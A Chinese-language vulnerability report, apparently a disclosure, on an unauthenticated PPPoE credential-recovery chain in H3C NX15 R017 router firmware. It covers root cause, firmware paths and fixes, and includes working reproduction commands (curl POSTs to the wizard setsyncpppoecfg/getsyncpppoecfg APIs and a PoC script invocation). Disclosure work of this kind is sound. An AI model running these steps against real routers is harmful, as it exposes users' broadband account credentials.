# H3C NX15 R017 未授权 PPPoE 凭据恢复漏洞链报告

## 一、漏洞概述

H3C NX15 路由器 NX15V100R017 固件的初始化向导接口中存在未授权 PPPoE 凭据恢复链。攻击者无需登录设备管理后台，即可调用 PPPoE 同步相关接口，使设备启动 PPPoE 服务端并记录外部 PPPoE 客户端提交的 PAP 用户名和密码，随后再通过未授权接口读取该凭据。

该漏洞可导致 PPPoE 账号、密码等敏感网络接入凭据泄露，可能进一步造成宽带账号被盗用、网络接入被冒用或用户隐私泄露。

## 二、影响范围

- 厂商：H3C
- 产品：H3C NX15 路由器
- 影响版本：NX15V100R017 / R017
- 漏洞类型：未授权访问 / 敏感信息泄露
- 认证要求：无需认证
- 攻击条件：攻击者可访问 Web 管理接口，并可在同二层网络中发起 PPPoE 客户端认证流量
- 影响结果：PPPoE 用户名和密码泄露

## 三、漏洞链路

完整攻击链如下：

1. 攻击者未认证调用：

   ```text
   POST /api/wizard/setsyncpppoecfg
   ```

2. 设备启动 PPPoE 服务端相关进程。
3. 攻击者控制的主机向设备发起 PPPoE PAP 认证。
4. 设备在运行时记录 PPPoE 认证用户名和密码。
5. 攻击者未认证调用：

   ```text
   POST /api/wizard/getsyncpppoecfg
   ```

6. 接口返回记录到的 PPPoE 用户名和密码。

## 四、根因分析

### 1. 向导接口缺少认证

固件中的向导接口将以下接口暴露在登录前：

```text
/api/wizard/setsyncpppoecfg
/api/wizard/getsyncpppoecfg
```

这两个接口没有强制要求 Web 管理会话。

### 2. Lua 映射到敏感后端对象

向导层将接口映射到内部后端对象：

```text
setsyncpppoecfg -> esps.pppoe.olduserpasswd set
getsyncpppoecfg -> esps.pppoe.olduserpasswd get
```

其中 `set` 用于启动 PPPoE 同步流程，`get` 用于读取同步结果。

### 3. 后端会记录 PAP 凭据

后端逻辑会启动 PPPoE 服务端，并在认证过程中把捕获到的 PPPoE 用户名和密码写入运行时文件。随后 `get` 逻辑读取该文件并将凭据返回给调用方。

固件中可确认存在与凭据记录相关的字符串，例如：

```text
/tmp/pppoe_passwd.txt
PPPoe User:%s
PPPoe Password:%s
```

这说明凭据记录逻辑是固件运行逻辑的一部分。

## 五、固件内定位路径

以下路径均为相对于解压后固件根文件系统的固件内部路径，用于审计定位：

- `/www/api`：Web API 二进制，负责分发 `/api/wizard/*` 请求。
- `/usr/lib/lua/wizard/setsyncpppoecfg.lua`：`setsyncpppoecfg` 向导接口映射逻辑。
- `/usr/lib/lua/wizard/getsyncpppoecfg.lua`：`getsyncpppoecfg` 向导接口映射逻辑。
- `/usr/lib/lua/protol_cvt.lua`：向导协议转换层。
- `/usr/libexec/rpcd/esps.pppoe.olduserpasswd`：PPPoE 凭据同步后端对象，实现 `set` 与 `get`。
- `/usr/sbin/pppoe-server`：后端启动的 PPPoE 服务端程序。
- `/usr/sbin/pppd`：PPP 认证相关程序，固件中包含凭据记录字符串。
- `/etc/ppp/pppoe-server-options`：PPPoE 服务端认证选项配置。
- `/tmp/pppoe_passwd.txt`：运行时凭据记录文件路径。

## 六、复现步骤

### 1. 触发未授权 PPPoE 同步服务

```bash
curl -sS -X POST 'http://192.168.8.1/api/wizard/setsyncpppoecfg' \
  -H 'Content-Type: application/json' \
  --data '{}'
```

### 2. 从同二层主机发起 PPPoE PAP 认证

可使用附件 PoC 自动完成触发、发现、认证和回读：

```bash
sudo BASE_URL=http://192.168.8.1 IFACE=<network-interface> \
  USER_NAME=pocuser PASSWORD=pocpass \
  bash poc/08_preauth_wizard_pppoe_credential_recovery.sh
```

### 3. 读取恢复到的凭据

```bash
curl -sS -X POST 'http://192.168.8.1/api/wizard/getsyncpppoecfg' \
  -H 'Content-Type: application/json' \
  --data '{}'
```

预期结果中可看到 PPPoE 用户名和密码字段，内容与发起 PPPoE PAP 认证时提交的凭据一致。

## 七、验证结果

在 NX15V100R017 测试设备上，使用如下测试凭据：

```text
user = pocuser
password = pocpass
```

完成 PPPoE PAP 认证后，未认证调用 `getsyncpppoecfg` 可以读取到相同的用户名和密码，证明未授权凭据恢复链成立。

## 八、危害说明

该漏洞的危害包括：

- 泄露 PPPoE 宽带账号和密码。
- 造成运营商接入账号被冒用。
- 攻击者可利用泄露凭据尝试其它网络接入或账号关联攻击。
- 未认证接口可被局域网内攻击者直接调用，攻击门槛较低。

## 九、附件

- 报告：`report/08_setsyncpppoecfg_runtime_analysis.md`
- PoC：`poc/08_preauth_wizard_pppoe_credential_recovery.sh`

## 十、修复建议

- 对 `/api/wizard/setsyncpppoecfg` 和 `/api/wizard/getsyncpppoecfg` 强制要求管理员认证。
- 限制 PPPoE 同步功能只能在首次配置或明确授权的维护流程中使用。
- 不应通过 Web API 明文返回 PPPoE 密码。
- 凭据临时文件应设置最小权限，并在读取后立即清理。
- 增加接口访问审计，记录 PPPoE 同步功能的调用来源和时间。
